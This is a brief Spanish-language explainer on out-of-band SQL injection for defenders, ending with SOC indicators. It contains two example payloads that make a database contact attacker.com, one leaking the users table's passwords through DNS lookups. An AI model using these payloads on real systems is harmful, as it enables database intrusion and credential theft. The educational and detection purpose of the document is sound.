# SQL Injection Fuera de Banda (OOB)

Ocurre cuando el atacante no puede ver la respuesta directamente, pero la base de datos envía datos a un servidor externo controlado por él.

## ¿Cómo funciona?

El atacante provoca que la base de datos haga una petición DNS o HTTP hacia un dominio suyo.

Ejemplo:

1' UNION SELECT LOAD_FILE('\\\\attacker.com\\x')--

O con DNS:

1' AND (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users),'.attacker.com\\x')))--

## Cuándo se usa

- cuando no hay errores visibles  
- cuando no hay diferencias de tiempo  
- cuando la aplicación filtra respuestas  

## Indicadores SOC

- peticiones DNS raras  
- tráfico saliente hacia dominios desconocidos  
- patrones de exfiltración  
